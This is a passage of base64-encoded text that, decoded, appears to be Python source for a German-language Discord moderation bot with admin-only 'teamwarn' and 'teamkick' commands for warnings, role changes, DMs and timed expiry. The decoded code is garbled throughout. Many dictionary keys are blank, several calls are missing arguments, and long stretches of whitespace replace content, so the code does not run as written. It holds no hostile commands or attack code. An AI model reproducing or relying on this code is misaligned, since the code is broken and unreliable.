zZXIubWVudGlvbiwNCiAgICAgICAgYWRtaW5fcm9sZXM9IiwgIi5qb2luKGYiPEAme3JvbGVfaWR9PiIgZm9yIHJvbGVfaWQgaW4gQURNSU5fUk9MRV9JRFMpDQogICAgKQ0KDQogICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKCLinIUgRGVyIERlcmFuayB3dXJkZSBlcmZvbGdyZWljaCBkdXJjaGdlZsO8aHJ0ISIsIGVwaGVtZXJhbD1UcnVlKQ0KICAgIGF3YWl0IGludGVyYWN0aW9uLmNoYW5uZWwuc2VuZChlbWJlZD1lbWJlZCkNCiAgICANCiAgICB0cnk6DQogICAgICAgIGF3YWl0IHNlbmRfZG0oDQogICAgICAgICAgICBtZW1iZXIsDQogICAgICAgICAgICAgICAgICAgICwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsDQogICAgICAgICAgICBpbnRlcmFjdGlvbg0KICAgICAgICApDQogICAgZXhjZXB0IGRpc2NvcmQuRm9yYmlkZGVuOg0KICAgICAgICBwcmludChmIltXQVJOVU5HXSBLb25udGUge21lbWJlcn0ga2VpbmUgRE0gc2VuZGVuIChETXMgbcO2Z2xpY2hlcndlaXNlIGRlYWt0aXZpZXJ0KS4iKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICBpZiBzdHIobWVtYmVyLmlkKSBub3QgaW4gaGlzdG9yeToNCiAgICAgICAgaGlzdG9yeVtzdHIobWVtYmVyLmlkKV0gPSB7DQogICAgICAgICAgICAgICAgICAgICAgIDogZGF0ZXRpbWUubm93KCkuc3RyZnRpbWUoIiVkLiVtLiVZICVIOiVNOiVTIiksDQogICAgICAgICAgICAgICAgICAgICAgICAgOiAiTi9BIiwNCiAgICAgICAgICAgICAgICAgICA6IFtdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDogIk4vQSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgIDogW10NCiAgICAgICAgfQ0KICAgIA0KICAgIGhpc3Rvcnlbc3RyKG1lbWJlci5pZCldWyJmdWxsX2hpc3RvcnkiXS5hcHBlbmQoDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICApDQogICAgc2F2ZV9oaXN0b3J5KGhpc3RvcnkpDQoNCkBib3QudHJlZS5jb21tYW5kKG5hbWU9InRlYW13YXJuIiwgZGVzY3JpcHRpb249IkdpYnQgZWluZW0gVGVhbW1pdGdsaWVkIGVpbmUgV2FybnVuZy4iKQ0KQGFwcF9jb21tYW5kcy5kZXNjcmliZSgNCiAgICBtZW1iZXI9IkRhcyBNaXRnbGllZCwgZGFzIGdld2FybnQgd2lyZC4iLA0KICAgIHJlYXNvbj0iR3J1bmQgZsO8ciBkaWUgV2FybnVuZy4iLA0KICAgIGR1cmF0aW9uPSJEYXVlciBpbiBTZWt1bmRlbiINCikNCmFzeW5jIGRlZiB0ZWFtd2FybihpbnRlcmFjdGlvbjogZGlzY29yZC5JbnRlcmFjdGlvbiwgbWVtYmVyOiBkaXNjb3JkLk1lbWJlciwgcmVhc29uOiBzdHIsIGR1cmF0aW9uOiBpbnQpOg0KICAgIGlmIG5vdCBpc19mZWF0dXJlX2VuYWJsZWQoInRlYW13YXJuIik6DQogICAgICAgIHJldHVybiBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIuKdjCBEaWVzZSBGdW5rdGlvbiBpc3QgZGVha3RpdmllcnQuIiwgZXBoZW1lcmFsPVRydWUpDQoNCiAgICBpZiBub3QgYW55KHJvbGUuaWQgaW4gQURNSU5fUk9MRV9JRFMgZm9yIHJvbGUgaW4gaW50ZXJhY3Rpb24udXNlci5yb2xlcyk6DQogICAgICAgIHJldHVybiBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIuKdjCBEdSBoYXN0IGtlaW5lIEJlcmVjaHRpZ3VuZyBmw7xyIGRpZXNlbiBCZWZlaGwuIiwgZXBoZW1lcmFsPVRydWUpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgIHdhcm5faWQgPSBzdHIoaW50KGRhdGV0aW1lLm5vdygpLnRpbWVzdGFtcCgpKSkgKyBzdHIobWVtYmVyLmlkKQ0KICAgIA0KICAgIHVzZXJfaWQgPSBzdHIobWVtYmVyLmlkKQ0KICAgIGlmIHVzZXJfaWQgbm90IGluIHdhcm5zOg0KICAgICAgICB3YXJuc1t1c2VyX2lkXSA9IFtdDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICB3YXJuc1t1c2VyX2lkXS5hcHBlbmQoew0KICAgICAgICAgICAgOiB3YXJuX2lkLA0KICAgICAgICAgICAgICAgIDogcmVhc29uLA0KICAgICAgICAgICAgICAgICA6IChkYXRldGltZS5ub3coKSArIHRpbWVkZWx0YShzZWNvbmRzPWR1cmF0aW9uKSkudGltZXN0YW1wKCksDQogICAgICAgICAgICAgICA6IGludGVyYWN0aW9uLnVzZXIuaWQNCiAgICB9KQ0KICAgIHNhdmVfd2FybnMoKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgd2Fybl9jb3VudCA9IGxlbihbdyBmb3IgdyBpbiB3YXJucy5nZXQodXNlcl9pZCwgW10pIGlmIG5vdCB3LmdldCgiZXhwaXJlZCIsIEZhbHNlKV0pDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgIHJvbGVfaW5kZXggPSAod2Fybl9jb3VudCAtIDEpICUgMyArIDEgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICBmb3Igcm9sZV9pZCBpbiBjb25maWdbIndhcm5fcm9sZXMiXS52YWx1ZXMoKToNCiAgICAgICAgcm9sZSA9IGRpc2NvcmQudXRpbHMuZ2V0KGludGVyYWN0aW9uLmd1aWxkLnJvbGVzLCBpZD1yb2xlX2lkKQ0KICAgICAgICBpZiByb2xlIGFuZCByb2xlIGluIG1lbWJlci5yb2xlczoNCiAgICAgICAgICAgIGF3YWl0IG1lbWJlci5yZW1vdmVfcm9sZXMocm9sZSkNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgIG5ld19yb2xlID0gZGlzY29yZC51dGlscy5nZXQoaW50ZXJhY3Rpb24uZ3VpbGQucm9sZXMsIGlkPWNvbmZpZ1sid2Fybl9yb2xlcyJdLmdldChzdHIocm9sZV9pbmRleCkpKQ0KICAgIGlmIG5ld19yb2xlOg0KICAgICAgICBhd2FpdCBtZW1iZXIuYWRkX3JvbGVzKG5ld19yb2xlKQ0KICAgIA0KICAgIG5ld19yb2xlID0gZGlzY29yZC51dGlscy5nZXQoaW50ZXJhY3Rpb24uZ3VpbGQucm9sZXMsIGlkPWNvbmZpZ1sid2Fybl9yb2xlcyJdLmdldChzdHIod2Fybl9jb3VudCkpKQ0KICAgIGlmIG5ld19yb2xlOg0KICAgICAgICBhd2FpdCBtZW1iZXIuYWRkX3JvbGVzKG5ld19yb2xlKQ0KDQogICAgICAgICAgICAgICAgICANCiAgICBlbWJlZCA9IGNyZWF0ZV9lbWJlZCgNCiAgICAgICAgICAgICAgICAgICwNCiAgICAgICAgbWVtYmVyPW1lbWJlci5tZW50aW9uLA0KICAgICAgICByZWFzb249cmVhc29uLA0KICAgICAgICBkdXJhdGlvbj1kdXJhdGlvbiwNCiAgICAgICAgYWRtaW49aW50ZXJhY3Rpb24udXNlci5tZW50aW9uLA0KICAgICAgICBhZG1pbl9yb2xlcz0iLCAiLmpvaW4oZiI8QCZ7cm9sZV9pZH0+IiBmb3Igcm9sZV9pZCBpbiBBRE1JTl9ST0xFX0lEUykNCiAgICApDQogICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2UuZGVmZXIoZXBoZW1lcmFsPVRydWUpDQogICAgYXdhaXQgaW50ZXJhY3Rpb24uY2hhbm5lbC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQogICAgICAgICAgICAgICANCiAgICB0cnk6DQogICAgICAgIGF3YWl0IHNlbmRfZG0obWVtYmVyLCAiVGVhbXdhcm4iLCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgDQogICAgICAgICAgICAgICAgICAgICBpbnRlcmFjdGlvbikNCiAgICBleGNlcHQgZGlzY29yZC5Gb3JiaWRkZW46DQogICAgICAgIHByaW50KGYiS29ubnRlIERNIGFuIHttZW1iZXJ9IG5pY2h0IHNlbmRlbiIpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgIGlmIHVzZXJfaWQgbm90IGluIGhpc3Rvcnk6DQogICAgICAgIGhpc3RvcnlbdXNlcl9pZF0gPSB7DQogICAgICAgICAgICAgICAgICAgICAgIDogZGF0ZXRpbWUubm93KCkuc3RyZnRpbWUoIiVkLiVtLiVZICVIOiVNOiVTIiksDQogICAgICAgICAgICAgICAgICAgOiBbXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgOiBbXQ0KICAgICAgICB9DQogICAgDQogICAgaGlzdG9yeVt1c2VyX2lkXVsid2FybnMiXS5hcHBlbmQoew0KICAgICAgICAgICAgOiB3YXJuX2lkLA0KICAgICAgICAgICAgICAgIDogcmVhc29uLA0KICAgICAgICAgICAgICAgIDogZGF0ZXRpbWUubm93KCkuc3RyZnRpbWUoIiVkLiVtLiVZICVIOiVNOiVTIiksDQogICAgICAgICAgICAgICAgIDogKGRhdGV0aW1lLm5vdygpICsgdGltZWRlbHRhKHNlY29uZHM9ZHVyYXRpb24pKS50aW1lc3RhbXAoKSwgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgOiBpbnRlcmFjdGlvbi51c2VyLmlkLA0KICAgICAgICAgICAgICAgICA6IEZhbHNlDQogICAgfSkNCiAgICBzYXZlX2hpc3RvcnkoaGlzdG9yeSkNCg0KICAgICAgICAgICAgICAgICAgICAgIA0KICAgIGFzeW5jIGRlZiBleHBpcmVfd2FybigpOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBhd2FpdCBhc3luY2lvLnNsZWVwKGR1cmF0aW9uKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICBpZiB1c2VyX2lkIG5vdCBpbiB3YXJuczoNCiAgICAgICAgICAgICAgICByZXR1cm4NCg0KICAgICAgICAgICAgd2Fybl9zdGlsbF9hY3RpdmUgPSBGYWxzZQ0KICAgICAgICAgICAgZm9yIHdhcm4gaW4gd2FybnNbdXNlcl9pZF06DQogICAgICAgICAgICAgICAgaWYgd2FyblsiaWQiXSA9PSB3YXJuX2lkIGFuZCBub3Qgd2Fybi5nZXQoInJlbW92ZWQiLCBGYWxzZSk6DQogICAgICAgICAgICAgICAgICAgIHdhcm5fc3RpbGxfYWN0aXZlID0gVHJ1ZQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIGlmIG5vdCB3YXJuX3N0aWxsX2FjdGl2ZToNCiAgICAgICAgICAgICAgICByZXR1cm4NCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICB3YXJuX2xldmVsID0gTm9uZQ0KICAgICAgICAgICAgZm9yIGksIHdhcm4gaW4gZW51bWVyYXRlKHdhcm5zW3VzZXJfaWRdKToNCiAgICAgICAgICAgICAgICBpZiB3YXJuWyJpZCJdID09IHdhcm5faWQ6DQogICAgICAgICAgICAgICAgICAgIHdhcm5fbGV2ZWwgPSBpICsgMSAgICAgICANCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgDQogICAgICAgICAgICBpZiB3YXJuX2xldmVsIGFuZCB3YXJuX2xldmVsIDw9IDM6DQogICAgICAgICAgICAgICAgcm9sZV9pZCA9IGNvbmZpZ1sid2Fybl9yb2xlcyJdLmdldChzdHIod2Fybl9sZXZlbCkpDQogICAgICAgICAgICAgICAgaWYgcm9sZV9pZDoNCiAgICAgICAgICAgICAgICAgICAgcm9sZSA9IGRpc2NvcmQudXRpbHMuZ2V0KGludGVyYWN0aW9uLmd1aWxkLnJvbGVzLCBpZD1yb2xlX2lkKQ0KICAgICAgICAgICAgICAgICAgICBpZiByb2xlIGFuZCByb2xlIGluIG1lbWJlci5yb2xlczoNCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IG1lbWJlci5yZW1vdmVfcm9sZXMocm9sZSkNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgZm9yIHdhcm4gaW4gd2FybnNbdXNlcl9pZF06DQogICAgICAgICAgICAgICAgaWYgd2FyblsiaWQiXSA9PSB3YXJuX2lkOg0KICAgICAgICAgICAgICAgICAgICB3YXJuWyJleHBpcmVkIl0gPSBUcnVlDQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBzYXZlX3dhcm5zKCkNCg0KICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBhd2FpdCBtZW1iZXIuc2VuZCgNCiAgICAgICAgICAgICAgICAgICAgZW1iZWQ9ZGlzY29yZC5FbWJlZCgNCiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlPSLinIUgV2FybnVuZyBhYmdlbGF1ZmVuIiwNCiAgICAgICAgICAgICAgICAgICAgICAgIGRlc2NyaXB0aW9uPWYiRGVpbmUgV2FybnVuZyBpc3QgYXV0b21hdGlzY2ggYWJnZWxhdWZlbi5cblxuKipHcnVuZDoqKiB7cmVhc29ufVxuKipEYXVlcjoqKiB7ZHVyYXRpb259c1xuKipXYXJuLUlEOioqIHt3YXJuX2lkfSIsDQogICAgICAgICAgICAgICAgICAgICAgICBjb2xvcj1kaXNjb3JkLkNvbG9yLmdyZWVuKCkNCiAgICAgICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgIGV4Y2VwdCBkaXNjb3JkLkZvcmJpZGRlbjoNCiAgICAgICAgICAgICAgICBwYXNzDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICBsb2dfY2hhbm5lbF9pZCA9IGNvbmZpZy5nZXQoIndhcm5fbG9nX2NoYW5uZWwiKQ0KICAgICAgICAgICAgaWYgbG9nX2NoYW5uZWxfaWQ6DQogICAgICAgICAgICAgICAgbG9nX2NoYW5uZWwgPSBib3QuZ2V0X2NoYW5uZWwobG9nX2NoYW5uZWxfaWQpDQogICAgICAgICAgICAgICAgaWYgbG9nX2NoYW5uZWw6DQogICAgICAgICAgICAgICAgICAgIGF3YWl0IGxvZ19jaGFubmVsLnNlbmQoDQogICAgICAgICAgICAgICAgICAgICAgICBlbWJlZD1kaXNjb3JkLkVtYmVkKA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlPSLimqDvuI8gV2FybnVuZyBhYmdlbGF1ZmVuIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZXNjcmlwdGlvbj1mIldhcm51bmcgZsO8ciB7bWVtYmVyLm1lbnRpb259IGlzdCBhYmdlbGF1ZmVuIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb2xvcj1kaXNjb3JkLkNvbG9yLmdyZWVuKCksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZXN0YW1wPWRhdGV0aW1lLm5vdygpDQogICAgICAgICAgICAgICAgICAgICAgICApDQogICAgICAgICAgICAgICAgICAgICAgICAuYWRkX2ZpZWxkKG5hbWU9IkdydW5kIiwgdmFsdWU9cmVhc29uLCBpbmxpbmU9RmFsc2UpDQogICAgICAgICAgICAgICAgICAgICAgICAuYWRkX2ZpZWxkKG5hbWU9IkRhdWVyIiwgdmFsdWU9ZiJ7ZHVyYXRpb259IFNla3VuZGVuIiwgaW5saW5lPVRydWUpDQogICAgICAgICAgICAgICAgICAgICAgICAuYWRkX2ZpZWxkKG5hbWU9Ildhcm4tSUQiLCB2YWx1ZT13YXJuX2lkLCBpbmxpbmU9VHJ1ZSkNCiAgICAgICAgICAgICAgICAgICAgICAgIC5zZXRfZm9vdGVyKHRleHQ9ZiJBdXRvbWF0aXNjaCBhYmdlbGF1ZmVuIikNCiAgICAgICAgICAgICAgICAgICAgKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgdXNlcl9pZCBpbiBoaXN0b3J5Og0KICAgICAgICAgICAgICAgIGZvciB3YXJuIGluIGhpc3RvcnlbdXNlcl9pZF1bIndhcm5zIl06DQogICAgICAgICAgICAgICAgICAgIGlmIHdhcm4uZ2V0KCJpZCIpID09IHdhcm5faWQ6DQogICAgICAgICAgICAgICAgICAgICAgICB3YXJuWyJleHBpcmVkIl0gPSBUcnVlDQogICAgICAgICAgICAgICAgICAgICAgICBoaXN0b3J5W3VzZXJfaWRdWyJsYXN0X3dhcm5fZXhwaXJlZCJdID0gZGF0ZXRpbWUubm93KCkuc3RyZnRpbWUoIiVkLiVtLiVZICVIOiVNOiVTIikNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgc2F2ZV9oaXN0b3J5KGhpc3RvcnkpDQoNCiAgICAgICAgZXhjZXB0IGFzeW5jaW8uQ2FuY2VsbGVkRXJyb3I6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIHJldHVybg0KDQogICAgYm90Lmxvb3AuY3JlYXRlX3Rhc2soZXhwaXJlX3dhcm4oKSkNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgIA0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KDQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCg0KICAgICAgICAgICAgICAgICAgDQoNCiAgICAgICAgICAgICAgIA0KICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgIA0KICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgDQoNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KDQpAYm90LnRyZWUuY29tbWFuZChuYW1lPSJ0ZWFta2ljayIsIGRlc2NyaXB0aW9uPSJFbnRmZXJudCBlaW4gVGVhbW1pdGdsaWVkIGF1cyBkZW0gVGVhbS4iKQ0KQGFwcF9jb21tYW5kcy5kZXNjcmliZShtZW1iZXI9IkRhcyBNaXRnbGllZCwgZGFzIGVudGZlcm50IHdpcmQuIiwgcmVhc29uPSJHcnVuZCBmw7xyIGRlbiBLaWNrIikNCmFzeW5jIGRlZiB0ZWFta2ljayhpbnRlcmFjdGlvbjogZGlzY29yZC5JbnRlcmFjdGlvbiwgbWVtYmVyOiBkaXNjb3JkLk1lbWJlciwgcmVhc29uOiBzdHIpOg0KICAgIGlmIG5vdCBpc19mZWF0dXJlX2VuYWJsZWQoInRlYW1raWNrIik6DQogICAgICAgIHJldHVybiBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIuKdjCBEaWVzZSBGdW5rdGlvbiBpc3QgZGVha3RpdmllcnQuIiwgZXBoZW1lcmFsPVRydWUpDQoNCiAgICBpZiBub3QgYW55KHJvbGUuaWQgaW4gQURNSU5fUk9MRV9JRFMgZm9yIHJvbGUgaW4gaW50ZXJhY3Rpb24udXNlci5yb2xlcyk6DQogICAgICAgIHJldHVybiBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIuKdjCBEdSBoYXN0IGtlaW5lIEJlcmVjaHRpZ3VuZyBmw7xyIGRpZXNlbiBCZWZlaGwuIiwgZXBoZW1lcmFsPVRydWUpDQoNCiAgICB0ZWFtX3JvbGVzID0gW3JvbGUgZm9yIHJvbGUgaW4gbWVtYmVyLnJvbGVzIGlmIHJvbGUuaWQgaW4gVEVBTV9ST0xFX0lEU10NCiAgICBpZiBub3QgdGVhbV9yb2xlczoNCiAgICAgICAgcmV0dXJuIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZSgi4p2MIERpZXNlcyBNaXRnbGllZCBoYXQga2VpbmUgVGVhbXJvbGxlLiIsIGVwaGVtZXJhbD1UcnVlKQ0KICAgIGZvciByb2xlIGluIHRlYW1fcm9sZXM6DQogICAgICAgIGF3YWl0IG1lbWJlci5yZW1vdmVfcm9sZXMocm9sZSkNCiAgICBlbWJlZCA9IGNyZWF0ZV9lbWJlZCgNCiAgICAgICAgICAgICAgICAgICwNCiAgICAgICAgbWVtYmVyPW1lbWJlci5tZW50aW9uLA0KICAgICAgICByZWFzb